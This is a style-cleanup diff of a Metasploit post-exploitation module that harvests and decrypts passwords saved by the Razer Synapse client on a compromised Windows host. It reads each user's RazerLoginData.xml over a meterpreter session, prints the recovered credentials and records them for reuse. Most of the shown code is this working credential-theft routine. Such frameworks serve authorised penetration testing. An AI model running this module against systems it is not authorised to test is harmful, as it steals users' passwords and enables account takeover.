@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,38 +9,36 @@ require 'rex'
 require 'openssl'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Post::Windows::UserProfiles
   include Msf::Post::File
 
-  def initialize(info={})
+  def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Windows Gather Razer Synapse Password Extraction',
-      'Description'    => %q{
-          This module will enumerate passwords stored by the Razer Synapse
-          client. The encryption key and iv is publicly known. This module
-          will not only extract encrypted password but will also decrypt
-          password using public key. Affects versions earlier than 1.7.15.
-        },
-      'License'        => MSF_LICENSE,
-      'Author'         =>
-        [
-          'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
-          'Matt Howard "pasv" <themdhoward[at]gmail.com>', #PoC
-          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
-        ],
-      'References'    =>
-        [
-          [ 'URL', 'http://www.pentestgeek.com/2013/01/16/hard-coded-encryption-keys-and-more-wordpress-fun/' ],
-          [ 'URL', 'https://github.com/pasv/Testing/blob/master/Razer_decode.py' ]
-        ],
-      'SessionTypes'   => [ 'meterpreter' ],
-      'Platform'      => [ 'win' ]
-    ))
+                      'Name'           => 'Windows Gather Razer Synapse Password Extraction',
+                      'Description'    => %q(
+                          This module will enumerate passwords stored by the Razer Synapse
+                          client. The encryption key and iv is publicly known. This module
+                          will not only extract encrypted password but will also decrypt
+                          password using public key. Affects versions earlier than 1.7.15.
+                        ),
+                      'License'        => MSF_LICENSE,
+                      'Author'         =>
+                        [
+                          'Thomas McCarthy "smilingraccoon" <smilingraccoon[at]gmail.com>',
+                          'Matt Howard "pasv" <themdhoward[at]gmail.com>', # PoC
+                          'Brandon McCann "zeknox" <bmccann[at]accuvant.com>'
+                        ],
+                      'References' =>
+                        [
+                          [ 'URL', 'http://www.pentestgeek.com/2013/01/16/hard-coded-encryption-keys-and-more-wordpress-fun/' ],
+                          [ 'URL', 'https://github.com/pasv/Testing/blob/master/Razer_decode.py' ]
+                        ],
+                      'SessionTypes' => [ 'meterpreter' ],
+                      'Platform' => [ 'win' ]))
   end
 
   def is_base64?(str)
-    str.match(/^([A-Za-z0-9+\/]{4})*([A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)$/) ? true : false
+    str =~ /^([A-Za-z0-9+\/]{4})*([A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}==)$/ ? true : false
   end
 
   # decrypt password
@@ -67,7 +66,7 @@ class MetasploitModule < Msf::Post
     }
 
     credential_data = {
-      post_reference_name: self.refname,
+      post_reference_name: refname,
       session_id: session_db_id,
       origin_type: :session,
       private_data: opts[:password],
@@ -83,7 +82,7 @@ class MetasploitModule < Msf::Post
 
     login_data = {
       core: create_credential(credential_data),
-      status: Metasploit::Model::Login::Status::UNTRIED,
+      status: Metasploit::Model::Login::Status::UNTRIED
     }.merge(service_data)
 
     create_credential_login(login_data)
@@ -93,7 +92,7 @@ class MetasploitModule < Msf::Post
   def get_creds(config)
     creds = []
 
-    return nil if !config.include?('<Version>')
+    return nil unless config.include?('<Version>')
 
     xml = ::Nokogiri::XML(config)
     xml.xpath('//SavedCredentials').each do |node|
@@ -121,33 +120,31 @@ class MetasploitModule < Msf::Post
 
   # main control method
   def run
-    grab_user_profiles().each do |user|
-      if user['LocalAppData']
-        accounts = user['LocalAppData'] + "\\Razer\\Synapse\\Accounts\\RazerLoginData.xml"
-        next if not file?(accounts)
-        print_status("Config found for user #{user['UserName']}")
+    grab_user_profiles.each do |user|
+      next unless user['LocalAppData']
+      accounts = user['LocalAppData'] + "\\Razer\\Synapse\\Accounts\\RazerLoginData.xml"
+      next unless file?(accounts)
+      print_status("Config found for user #{user['UserName']}")
 
-        contents = read_file(accounts)
+      contents = read_file(accounts)
 
-        # read the contents of file
-        creds = get_creds(contents)
-        unless creds.empty?
-          creds.each do |c|
-            user = c[:user]
-            pass = c[:pass]
-            type = c[:type]
+      # read the contents of file
+      creds = get_creds(contents)
+      next if creds.empty?
+      creds.each do |c|
+        user = c[:user]
+        pass = c[:pass]
+        type = c[:type]
 
-            print_good("Found cred: #{user}:#{pass}")
-            report_cred(
-              ip: razerzone_ip,
-              port: 443,
-              service_name: 'http',
-              user: user,
-              password: pass,
-              type: type
-            )
-          end
-        end
+        print_good("Found cred: #{user}:#{pass}")
+        report_cred(
+          ip: razerzone_ip,
+          port: 443,
+          service_name: 'http',
+          user: user,
+          password: pass,
+          type: type
+        )
       end
     end
   end
